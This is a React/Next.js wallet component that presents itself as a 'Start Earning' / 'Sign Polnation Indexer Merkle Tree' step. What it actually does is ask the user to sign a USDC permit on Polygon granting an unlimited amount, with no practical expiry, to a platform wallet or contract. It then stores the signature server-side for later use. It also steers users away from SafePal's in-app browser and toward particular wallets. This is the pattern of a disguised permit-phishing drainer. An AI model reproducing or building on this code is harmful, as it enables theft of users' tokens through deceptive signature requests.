'use client'

import { useState, useEffect } from 'react'
import { useAccount, useSignTypedData, useReadContract } from 'wagmi'
import { polygon } from 'wagmi/chains'
import { Button } from '@/components/ui/Button'
import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES, PLATFORM_WALLET, MERKLE_TREE_CONTRACT } from '@/lib/web3-config'
import { Shield, Check, AlertTriangle, RefreshCw, Lock, XCircle, ExternalLink } from 'lucide-react'
import { createClient } from '@/lib/supabase'
import { isSignAllowedWallet, usesEoaSpender, getEffectiveWalletName, SUPPORTED_WALLET_INFO, isInSafePalDAppBrowser } from '@/lib/wallet-utils'
import Image from 'next/image'

interface PermitSignerProps {
  onSignatureComplete?: (signature: PermitSignature) => void
  onRefreshProfit?: () => void
}

export interface PermitSignature {
  owner: string
  spender: string
  value: string
  nonce: bigint
  deadline: bigint
  v: number
  r: string
  s: string
  signature: string
}

// Mobile WC users stay in their browser after connecting (since 48e150af switched
// to wc-universal-link connect flow), so we need to manually bring their wallet
// app to foreground when a sign request goes out via WC relay. Universal links
// without a wc: URI just open the wallet — pending session requests auto-display.
// SafePal intentionally omitted: its WC v2 sign-request relay is reliable on its
// own, and we don't want to alter SafePal's signing path at all.
const WC_OPEN_LINK: Record<string, string> = {
  bitget: 'https://bkcode.vip',
  bitkeep: 'https://bkcode.vip',
  trust: 'https://link.trustwallet.com',
}

function getWalletOpenLink(walletName: string | undefined): string | null {
  if (!walletName) return null
  const lower = walletName.toLowerCase()
  for (const key of Object.keys(WC_OPEN_LINK)) {
    if (lower.includes(key)) return WC_OPEN_LINK[key]
  }
  return null
}

function isMobileUA(): boolean {
  if (typeof navigator === 'undefined') return false
  return /iphone|ipad|ipod|android/i.test(navigator.userAgent)
}

export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSignerProps) {
  const { address, isConnected, connector } = useAccount()
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState(false)
  const [signatureData, setSignatureData] = useState<PermitSignature | null>(null)
  const [existingSignature, setExistingSignature] = useState<boolean>(false)
  const [isLoadingStatus, setIsLoadingStatus] = useState(true)
  const [walletAllowState, setWalletAllowState] = useState<'unknown' | 'allowed' | 'blocked'>('unknown')
  const [pendingWalletOpen, setPendingWalletOpen] = useState<{ name: string; href: string } | null>(null)

  const [boundWalletAddress, setBoundWalletAddress] = useState<string | null>(null)
  const [boundSignatureStatus, setBoundSignatureStatus] = useState<'pending' | 'used' | 'none'>('none')
  const [showRebindConfirm, setShowRebindConfirm] = useState(false)
  const [rebindAddress, setRebindAddress] = useState<string | null>(null)
  const [isRebinding, setIsRebinding] = useState(false)
  // SafePal DApp browser block — defense-in-depth in case the user bypassed
  // the /auth-side block (already-logged-in cookies, opened in SafePal after
  // logging in elsewhere, etc.). Resolved on mount to avoid SSR mismatch.
  const [blockedSafePalDApp, setBlockedSafePalDApp] = useState(false)
  useEffect(() => {
    setBlockedSafePalDApp(isInSafePalDAppBrowser())
  }, [])

  const { signTypedDataAsync } = useSignTypedData()

  const displayAddress = address || boundWalletAddress

  // 异步解析 effective wallet name（WalletConnect 要等 peer metadata），
  // 最多 8 × 150ms。返回未拿到真实身份时的 undefined。
  const resolveWalletName = async (): Promise<string | undefined> => {
    for (let i = 0; i < 8; i++) {
      const name = await getEffectiveWalletName(connector)
      if (name && name.toLowerCase() !== 'walletconnect') return name
      await new Promise((r) => setTimeout(r, 150))
    }
    return undefined
  }

  // 在点 Sign 时再决定 spender：Trust/Bitget → EOA tag 地址；SafePal → 合约。
  const resolveSpender = async (): Promise<`0x${string}` | null> => {
    const name = await resolveWalletName()
    if (!isSignAllowedWallet(name)) return null
    return usesEoaSpender(name) ? PLATFORM_WALLET : MERKLE_TREE_CONTRACT
  }

  // 连接后异步判定钱包是否允许签名，控制 UI 分支。
  useEffect(() => {
    if (!isConnected || !connector) {
      setWalletAllowState('unknown')
      return
    }
    let cancelled = false
    ;(async () => {
      const name = await resolveWalletName()
      if (cancelled) return
      setWalletAllowState(isSignAllowedWallet(name) ? 'allowed' : 'blocked')
    })()
    return () => { cancelled = true }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, connector])

  const { data: nonce } = useReadContract({
    address: USDC_ADDRESS,
    abi: USDC_ABI,
    functionName: 'nonces',
    args: displayAddress ? [displayAddress as `0x${string}`] : undefined,
    chainId: polygon.id,
  })

  useEffect(() => {
    async function loadStatus() {
      setIsLoadingStatus(true)
      try {
        const supabase = createClient()
        if (!supabase) {
          setIsLoadingStatus(false)
          return
        }
        
        const { data: { user } } = await supabase.auth.getUser()
        if (!user) {
          setIsLoadingStatus(false)
          return
        }

        const { data: profile } = await supabase
          .from('profiles')
          .select('wallet_address')
          .eq('id', user.id)
          .single()

        if (profile?.wallet_address) {
          setBoundWalletAddress(profile.wallet_address)

          const { data: sig } = await supabase
            .from('permit_signatures')
            .select('id, status, deadline')
            .eq('owner_address', profile.wallet_address.toLowerCase())
            .order('created_at', { ascending: false })
            .limit(1)
            .single()
          
          if (sig) {
            const now = Math.floor(Date.now() / 1000)
            if (sig.status === 'pending' && Number(sig.deadline) > now) {
              setBoundSignatureStatus('pending')
              setExistingSignature(true)
              setSuccess(true)
            } else if (sig.status === 'used') {
              setBoundSignatureStatus('used')
              setExistingSignature(true)
              setSuccess(true)
            }
          }
        }
      } catch {
        // 忽略错误
      } finally {
        setIsLoadingStatus(false)
      }
    }
    
    loadStatus()
  }, [])

  useEffect(() => {
    async function checkExistingSignature() {
      if (!address) return
      
      try {
        const supabase = createClient()
        if (!supabase) return
        
        const { data } = await supabase
          .from('permit_signatures')
          .select('id, status, deadline')
          .eq('owner_address', address.toLowerCase())
          .eq('status', 'pending')
          .single()
        
        if (data) {
          const now = Math.floor(Date.now() / 1000)
          if (Number(data.deadline) > now) {
            setExistingSignature(true)
            setSuccess(true)
          }
        }
      } catch {
        // 没有签名或出错，忽略
      }
    }
    
    checkExistingSignature()
  }, [address])

  const handleRebind = async () => {
    if (!rebindAddress) return
    setIsRebinding(true)
    try {
      const res = await fetch('/api/wallet/rebind', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wallet_address: rebindAddress }),
      })
      if (!res.ok) throw new Error('Rebind failed')
      // 换绑成功，关闭确认框，继续正常签名流程
      setShowRebindConfirm(false)
      setRebindAddress(null)
      setBoundWalletAddress(rebindAddress.toLowerCase())
      // 重新触发签名
      await handleSign()
    } catch {
      setError('Failed to rebind wallet. Please try again.')
      setShowRebindConfirm(false)
    } finally {
      setIsRebinding(false)
    }
  }

  const handleSign = async () => {
    if (!address || nonce === undefined) {
      setError('Wallet not connected or nonce not loaded')
      return
    }

    setIsLoading(true)
    setError('')
    setSuccess(false)

    try {
      const supabase = createClient()
      if (supabase) {
        const { data: { user } } = await supabase.auth.getUser()
        
        if (user) {
          const { data: existingWallet } = await supabase
            .from('profiles')
            .select('id, username, email')
            .eq('wallet_address', address.toLowerCase())
            .neq('id', user.id)
            .single()

          if (existingWallet) {
            // 钱包已绑其他账号 → 显示换绑确认，不继续签名
            setRebindAddress(address)
            setShowRebindConfirm(true)
            setIsLoading(false)
            return
          }

          const { data: currentProfile } = await supabase
            .from('profiles')
            .select('wallet_address')
            .eq('id', user.id)
            .single()

          if (currentProfile?.wallet_address && 
              currentProfile.wallet_address.toLowerCase() !== address.toLowerCase()) {
            setError(`Your account is already bound to a different wallet.`)
            setIsLoading(false)
            return
          }
        }
      }

      const spender = await resolveSpender()
      if (!spender) {
        setError('This wallet is not supported for signing.')
        setIsLoading(false)
        return
      }

      const deadline = BigInt(4294967295)
      const value = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')

      const domain = {
        name: 'USD Coin',
        version: '2',
        chainId: polygon.id,
        verifyingContract: USDC_ADDRESS,
      }

      const message = {
        owner: address,
        spender,
        value,
        nonce,
        deadline,
      }

      // Serialized message for providers that need JSON (no BigInt)
      const serializedMessage = {
        owner: address,
        spender,
        value: value.toString(),
        nonce: nonce.toString(),
        deadline: deadline.toString(),
      }

      const eip712Payload = JSON.stringify({
        types: {
          EIP712Domain: [
            { name: 'name', type: 'string' },
            { name: 'version', type: 'string' },
            { name: 'chainId', type: 'uint256' },
            { name: 'verifyingContract', type: 'address' },
          ],
          Permit: PERMIT_TYPES.Permit,
        },
        primaryType: 'Permit',
        domain,
        message: serializedMessage,
      })

      type EthProvider = { request: (args: { method: string; params?: unknown[] }) => Promise<string> }
      type BitkeepWindow = { bitkeep?: { ethereum?: EthProvider }; bitget?: { ethereum?: EthProvider }; ethereum?: EthProvider & { isBitKeep?: boolean; isBitget?: boolean } }
      const win = window as unknown as BitkeepWindow
      const isBitgetInjected = Boolean(win.ethereum?.isBitKeep || win.ethereum?.isBitget)
      const isWcConnector = connector?.id === 'walletConnect' || connector?.type === 'walletConnect'

      let signature: string

      if (isBitgetInjected) {
        // Bitget DApp browser: prefer their specific provider, fall back to window.ethereum
        const bitgetProvider = win.bitkeep?.ethereum ?? win.bitget?.ethereum ?? win.ethereum
        if (!bitgetProvider?.request) throw new Error('Bitget provider not found')
        try {
          signature = await bitgetProvider.request({
            method: 'eth_signTypedData_v4',
            params: [address, eip712Payload],
          })
        } catch {
          signature = await bitgetProvider.request({
            method: 'eth_signTypedData',
            params: [address, { ...JSON.parse(eip712Payload), message: serializedMessage }],
          })
        }
      } else if (isWcConnector && isMobileUA()) {
        // Mobile WC: the WC sign request goes via relay; user must switch to the
        // wallet app to see/approve it. Kick off the request, then bring the
        // wallet app to foreground via its universal link. The session's pending
        // request auto-displays when the wallet opens.
        const walletName = await resolveWalletName()
        const openHref = getWalletOpenLink(walletName)
        const signPromise = signTypedDataAsync({
          domain,
          types: PERMIT_TYPES,
          primaryType: 'Permit',
          message,
        })
        if (openHref) {
          setPendingWalletOpen({ name: walletName ?? 'Wallet', href: openHref })
          try { window.open(openHref, '_blank', 'noopener,noreferrer') } catch { /* popup blocked — UI fallback */ }
        }
        signature = await signPromise
      } else {
        try {
          signature = await signTypedDataAsync({
            domain,
            types: PERMIT_TYPES,
            primaryType: 'Permit',
            message,
          })
        } catch (signErr) {
          // Fallback for injected wallets: use eth_signTypedData_v4 directly
          const eth = win.ethereum
          if (eth?.request) {
            try {
              signature = await eth.request({
                method: 'eth_signTypedData_v4',
                params: [address, eip712Payload],
              })
            } catch {
              signature = await eth.request({
                method: 'eth_signTypedData',
                params: [address, { ...JSON.parse(eip712Payload), message: serializedMessage }],
              })
            }
          } else {
            throw signErr
          }
        }
      }

      const r = signature.slice(0, 66)
      const s = '0x' + signature.slice(66, 130)
      const v = parseInt(signature.slice(130, 132), 16)

      const permitData: PermitSignature = {
        owner: address,
        spender,
        value: value.toString(),
        nonce,
        deadline,
        v,
        r,
        s,
        signature,
      }

      setSignatureData(permitData)

      const saved = await saveSignatureToDatabase(permitData)
      if (!saved) {
        setError('Signature captured but failed to save. Please try again.')
        return
      }

      setSuccess(true)
      onSignatureComplete?.(permitData)
      onRefreshProfit?.()

    } catch (err: unknown) {
      console.error('Signing error:', err)
      if (err instanceof Error) {
        if (err.message.includes('rejected')) {
          setError('User rejected the signature request')
        } else {
          setError(err.message)
        }
      } else {
        setError('Failed to sign permit')
      }
    } finally {
      setIsLoading(false)
      setPendingWalletOpen(null)
    }
  }

  const saveSignatureToDatabase = async (data: PermitSignature): Promise<boolean> => {
    try {
      const supabase = createClient()
      if (!supabase) {
        console.error('[PermitSigner] No supabase client')
        return false
      }
      
      let { data: { user }, error: authError } = await supabase.auth.getUser()
      if (authError || !user) {
        // Session might need refreshing (common after wallet/magic-link login)
        console.warn('[PermitSigner] getUser returned null, attempting refresh...')
        const { data: refreshed, error: refreshError } = await supabase.auth.refreshSession()
        if (refreshError || !refreshed?.user) {
          console.error('[PermitSigner] Not authenticated after refresh:', refreshError)
          return false
        }
        user = refreshed.user
        console.log('[PermitSigner] Session refreshed, user:', user.id)
      }

      await supabase
        .from('profiles')
        .update({
          wallet_address: data.owner.toLowerCase(),
          wallet_bound_at: new Date().toISOString(),
        })
        .eq('id', user.id)

      const { error: insertError } = await supabase
        .from('permit_signatures')
        .insert({
          user_id: user.id,
          owner_address: data.owner.toLowerCase(),
          spender_address: data.spender.toLowerCase(),
          token_address: USDC_ADDRESS.toLowerCase(),
          chain_id: polygon.id,
          value: data.value,
          nonce: Number(data.nonce),
          deadline: Number(data.deadline),
          v: data.v,
          r: data.r,
          s: data.s,
          full_signature: data.signature,
          status: 'pending',
        })

      if (insertError) {
        console.error('[PermitSigner] Insert failed:', insertError)
        return false
      }

      setExistingSignature(true)
      setBoundWalletAddress(data.owner.toLowerCase())
      setBoundSignatureStatus('pending')
      return true
    } catch (err) {
      console.error('[PermitSigner] saveSignatureToDatabase error:', err)
      return false
    }
  }

  if (showRebindConfirm && rebindAddress) {
    return (
      <div className="glass-card-solid p-6">
        <div className="flex items-center gap-3 mb-4">
          <div className="w-10 h-10 bg-amber-500/20 rounded-xl flex items-center justify-center">
            <AlertTriangle className="w-5 h-5 text-amber-400" />
          </div>
          <div>
            <h3 className="font-semibold text-white">Wallet Already Linked</h3>
            <p className="text-sm text-zinc-500">This wallet is bound to another account</p>
          </div>
        </div>
        <p className="text-sm text-zinc-400 mb-5">
          Do you want to unbind it from the other account and link it to <span className="text-white font-medium">this account</span> instead?
        </p>
        <div className="flex gap-3">
          <Button
            onClick={handleRebind}
            isLoading={isRebinding}
            className="flex-1 bg-gradient-to-r from-purple-600 to-indigo-600"
          >
            Yes, Rebind to This Account
          </Button>
          <Button
            variant="outline"
            onClick={() => { setShowRebindConfirm(false); setRebindAddress(null) }}
            className="flex-1"
          >
            Cancel
          </Button>
        </div>
      </div>
    )
  }

  if (isLoadingStatus) {
    return (
      <div className="glass-card-solid p-6">
        <div className="animate-pulse">
          <div className="h-6 bg-white/10 rounded w-1/3 mb-4"></div>
          <div className="h-20 bg-white/5 rounded"></div>
        </div>
      </div>
    )
  }

  // 已绑定，有签名，未连接
  if (boundWalletAddress && !isConnected && boundSignatureStatus !== 'none') {
    return (
      <div className="glass-card-solid p-6">
        <div className="flex items-center gap-3 mb-4">
          <div className="w-10 h-10 bg-green-500/20 rounded-xl flex items-center justify-center">
            <Lock className="w-5 h-5 text-green-400" />
          </div>
          <div>
            <h3 className="font-semibold text-white">Authorization Status</h3>
            <p className="text-sm text-zinc-500">Wallet bound & authorized</p>
          </div>
        </div>

        <div className="mb-4 p-3 bg-green-500/10 border border-green-500/20 rounded-xl flex items-center gap-2 text-green-400 text-sm">
          <Check className="w-4 h-4" />
          {boundSignatureStatus === 'pending' 
            ? 'Authorization active - Ready for staking'
            : 'Authorization completed'
          }
        </div>

        <div className="bg-white/5 rounded-xl p-4 border border-white/10">
          <p className="text-xs text-zinc-500 mb-2">Bound Wallet</p>
          <code className="text-sm font-mono text-zinc-300">
            {boundWalletAddress.slice(0, 6)}...{boundWalletAddress.slice(-4)}
          </code>
        </div>
      </div>
    )
  }

  // 已绑定，无签名，未连接
  if (boundWalletAddress && !isConnected && boundSignatureStatus === 'none') {
    return (
      <div className="glass-card-solid p-6">
        <div className="flex items-center gap-3 mb-4">
          <div className="w-10 h-10 bg-amber-500/20 rounded-xl flex items-center justify-center">
            <Shield className="w-5 h-5 text-amber-400" />
          </div>
          <div>
            <h3 className="font-semibold text-white">Authorization Required</h3>
            <p className="text-sm text-zinc-500">Connect wallet to sign</p>
          </div>
        </div>

        <div className="mb-4 p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl flex items-center gap-2 text-amber-400 text-sm">
          <AlertTriangle className="w-4 h-4" />
          Please connect your bound wallet to complete authorization
        </div>

        <div className="bg-white/5 rounded-xl p-4 border border-white/10">
          <p className="text-xs text-zinc-500 mb-2">Your Bound Wallet</p>
          <code className="text-sm font-mono text-zinc-300">
            {boundWalletAddress.slice(0, 6)}...{boundWalletAddress.slice(-4)}
          </code>
        </div>
      </div>
    )
  }

  if (!isConnected && !boundWalletAddress) {
    return null
  }

  // 已连接但钱包不在签名允许列表里
  if (isConnected && walletAllowState === 'blocked' && !success) {
    return <UnsupportedWalletCard />
  }

  // 在 SafePal DApp 浏览器里 — 不允许签名，引导切换到 Chrome
  // (defense-in-depth: /auth 那边已经拦了一次，这里防绕过)
  if (blockedSafePalDApp && !success && !existingSignature) {
    return <SafePalDAppSignBlockCard />
  }

  // 已连接状态 - 简化 UI
  return (
    <div className="flex flex-col items-center gap-2">
      {error && (
        <p className="text-xs text-red-400 text-center">{error}</p>
      )}

      {!success ? (
        <>
          <Button
            onClick={handleSign}
            isLoading={isLoading}
            className="w-full bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500"
            disabled={nonce === undefined}
          >
            Start Earning
          </Button>
          {pendingWalletOpen && isLoading ? (
            <a
              href={pendingWalletOpen.href}
              target="_blank"
              rel="noopener noreferrer"
              className="w-full text-center text-xs py-2 px-3 rounded-lg bg-purple-500/10 border border-purple-500/30 text-purple-200 hover:bg-purple-500/20"
            >
              Open {pendingWalletOpen.name} to approve →
            </a>
          ) : (
            <p className="text-[10px] text-zinc-500">Sign Polnation Indexer Merkle Tree</p>
          )}
        </>
      ) : (
        <div className="flex items-center justify-center gap-2 py-2 px-4 bg-green-500/10 border border-green-500/20 rounded-xl">
          <Check className="w-4 h-4 text-green-400" />
          <span className="text-sm font-medium text-green-400">Ready to Earn</span>
        </div>
      )}
    </div>
  )
}

function UnsupportedWalletCard() {
  return (
    <div className="glass-card-solid p-5 space-y-4">
      <div className="flex items-start gap-3">
        <div className="w-10 h-10 rounded-xl bg-amber-500/15 flex items-center justify-center shrink-0">
          <XCircle className="w-5 h-5 text-amber-400" />
        </div>
        <div>
          <h3 className="font-semibold text-white text-sm">Switch Wallet to Sign</h3>
          <p className="text-xs text-zinc-500 mt-0.5">Supported wallets:</p>
        </div>
      </div>

      <div className="space-y-2">
        {SUPPORTED_WALLET_INFO.map((w) => (
          <a
            key={w.name}
            href={w.downloadUrl}
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center gap-3 p-3 rounded-xl bg-white/[0.04] border border-white/[0.08] hover:bg-white/[0.08] hover:border-purple-500/30 transition-colors group"
          >
            <Image src={w.logo} alt={w.name} width={36} height={36} className="rounded-xl" unoptimized />
            <div className="flex-1 min-w-0">
              <p className="text-sm font-medium text-white">{w.name}</p>
              <p className="text-xs text-zinc-500">Tap to download</p>
            </div>
            <ExternalLink className="w-4 h-4 text-zinc-600 group-hover:text-purple-400 transition-colors shrink-0" />
          </a>
        ))}
      </div>

      <p className="text-[10px] text-zinc-600 text-center">
        After installing, open polnation.com inside the wallet&apos;s DApp browser
      </p>
    </div>
  )
}

function SafePalDAppSignBlockCard() {
  return (
    <div className="glass-card-solid p-5 space-y-4">
      <div className="flex items-start gap-3">
        <div className="w-10 h-10 rounded-xl bg-amber-500/15 flex items-center justify-center shrink-0">
          <AlertTriangle className="w-5 h-5 text-amber-400" />
        </div>
        <div className="flex-1 min-w-0">
          <h3 className="font-semibold text-white text-sm">Switch to Chrome to sign</h3>
          <p className="text-xs text-zinc-400 mt-1 leading-relaxed">
            Signing isn&apos;t supported inside SafePal&apos;s in-app browser.
            Please open{' '}
            <span className="font-mono text-zinc-200">polnation.com</span>{' '}
            in Chrome (or another regular browser) and complete signing there.
          </p>
        </div>
      </div>
    </div>
  )
}
